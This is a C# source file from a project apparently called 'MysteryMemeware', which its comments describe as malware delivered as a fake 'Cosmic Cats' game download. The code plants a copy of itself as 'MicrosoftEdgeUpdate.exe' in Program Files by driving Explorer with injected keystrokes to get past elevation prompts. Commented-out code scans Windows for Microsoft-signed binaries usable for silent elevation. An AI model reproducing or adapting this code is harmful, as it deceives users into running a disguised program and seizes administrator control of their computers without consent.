using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Security.Principal;
using System.Diagnostics;
using Microsoft.Win32.SafeHandles;
using System.Security.Claims;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Security.Cryptography.X509Certificates;
using System.Collections.Specialized;
using System.Windows.Forms;
using System.DirectoryServices.ActiveDirectory;
using System.DirectoryServices.AccountManagement;
using MysteryMemeware.Helpers;

namespace MysteryMemeware
{
    //Phase one runs when the user first starts runs the application. Phase one is the exe file you download when you want to play Cosmic Cats and is responsible for gaining administrator access in several different ways.
    public static class PhaseOne
    {
        public static void Main()
        {
            OpenTaskMGR();
            return;
            if (UACHelper.CurrentProcessIsAdmin)
            {
                return;
            }
            else if (UACHelper.CurrentUserIsAdmin)
            {

            }
            else
            {

            }
        }
        [DllImport("user32.dll", SetLastError = true)]
        static extern bool SetCursorPos(int x, int y);
        [DllImport("user32.dll", SetLastError = true)]
        static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);

        public const int KEYEVENT_KEYDOWN = 0x0000;
        public const int KEYEVENT_KEYUP = 0x0002;

        public const int VK_CONTROL = 0xA2;
        public const int VK_V = 0x56;
        public const int VK_ENTER = 0x0D;
        public static unsafe IntPtr GetPointer(object obj)
        {
            object pointerTarget = obj;
            TypedReference typedRefrence = __makeref(obj);
            IntPtr pointer = **(IntPtr**)(&typedRefrence);
            return pointer;
        }
        public static void OpenTaskMGR()
        {
            string programLocation = typeof(Program).Assembly.Location;
            string programDirectory = Path.GetDirectoryName(programLocation);
            string imposterLocation = programDirectory + "\\MicrosoftEdgeUpdate.exe";
            if (File.Exists(imposterLocation))
            {
                File.Delete(imposterLocation);
            }
            File.Copy(programLocation, imposterLocation);
            DateTime explorerLaunchTime = DateTime.Now;
            ProcessHelper.Start(new TerminalCommand($"\"{Environment.GetFolderPath(Environment.SpecialFolder.Windows)}\\explorer.exe\" /e,\"{Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86)}\\Microsoft\\EdgeUpdate\""));
            Process explorer = WaitForExplorer(explorerLaunchTime, new TimeSpan(10000000));
            StringCollection clipboardContents = new StringCollection();
            clipboardContents.Add(imposterLocation);
            Clipboard.SetFileDropList(clipboardContents);
            explorerLaunchTime = DateTime.Now;
            keybd_event(VK_CONTROL, 0, KEYEVENT_KEYDOWN, 0);
            keybd_event(VK_V, 0, KEYEVENT_KEYDOWN, 0);
            keybd_event(VK_V, 0, KEYEVENT_KEYUP, 0);
            keybd_event(VK_CONTROL, 0, KEYEVENT_KEYUP, 0);
            Process explorerPopup1 = WaitForExplorer(explorerLaunchTime, new TimeSpan(10000000));
            explorer.Kill();
            Thread.Sleep(3000);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYDOWN, 0);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYUP, 0);
            Thread.Sleep(3000);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYDOWN, 0);
            keybd_event(VK_ENTER, 0, KEYEVENT_KEYUP, 0);
            Thread.Sleep(3000);
        }
        public static Process GetShell()
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                try
                {
                    if (process.ProcessName is "explorer")
                    {
                        if (process.MainWindowTitle is "")
                        {
                            return process;
                        }
                    }
                }
                catch
                {

                }
            }
            return null;
        }
        public static Process WaitForExplorer(DateTime earliestLaunchTime, TimeSpan minimumWaitTime)
        {
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            while (true)
            {
                Process[] processes = Process.GetProcesses();
                foreach (Process process in processes)
                {
                    try
                    {
                        if (process.ProcessName is "explorer")
                        {
                            if (process.StartTime.Ticks < earliestLaunchTime.Ticks)
                            {
                                process.WaitForInputIdle();
                                if (!process.HasExited && stopwatch.ElapsedTicks > minimumWaitTime.Ticks)
                                {
                                    return process;
                                }
                            }
                        }
                    }
                    catch
                    {

                    }
                }
            }
        }
        public static void KillAllExplorers()
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process process in processes)
            {
                try
                {
                    if (process.ProcessName is "explorer")
                    {
                        process.Kill();
                    }
                }
                catch
                {

                }
            }
        }
        public static List<string> potentials = new List<string>();
        public static void RetrieveToken()
        {
            OpenTaskMGR();
            /*Console.ForegroundColor = ConsoleColor.Green;
            string[] files = GetFilesRecursive("C:\\Windows").ToArray();
            Console.ForegroundColor = ConsoleColor.DarkBlue;
            foreach (string filePath in files)
            {
                Console.WriteLine(filePath);
                CheckFile(filePath);
            }
            string output = "";
            foreach(string t in potentials)
            {
                output += t + "\n";
            }
            File.WriteAllText("D:\\Output.txt", output);
            return;*/

            /* OpenTaskMGR();
             Thread.Sleep(100);
             MaximizeCurrentWindow();
             Thread.Sleep(100);*/
            /*while (true)
            {
                SetCursorPos(0, 0);
                Thread.Sleep(100);
            }*/
        }
        public static List<string> GetFilesRecursive(string directoryPath)
        {
            Console.WriteLine(directoryPath);
            try
            {
                List<string> files = new List<string>(Directory.GetFiles(directoryPath));

                try
                {
                    foreach (string subDirectory in Directory.GetDirectories(directoryPath))
                    {
                        files.AddRange(GetFilesRecursive(subDirectory));
                    }
                }
                catch
                {

                }

                return files;
            }
            catch
            {
                return new List<string>();
            }

        }
        public static void CheckFile(string filePath)
        {
            try
            {
                var cert = X509Certificate.CreateFromSignedFile(filePath);
                try
                {
                    if (!(cert is null) && (cert.Subject.ToUpper().Contains("CN=MICROSOFT WINDOWS,") || cert.Subject.ToUpper().EndsWith("CN=MICROSOFT WINDOWS")))
                    {
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"File \"{filePath}\" was signed for silent elevation.");
                        potentials.Add(filePath);
                        Console.ForegroundColor = ConsoleColor.White;
                    }
                }
                catch
                {

                }
                if (!(cert is null))
                {
                    cert.Dispose();
                }
            }
            catch
            {

            }
        }
    }
}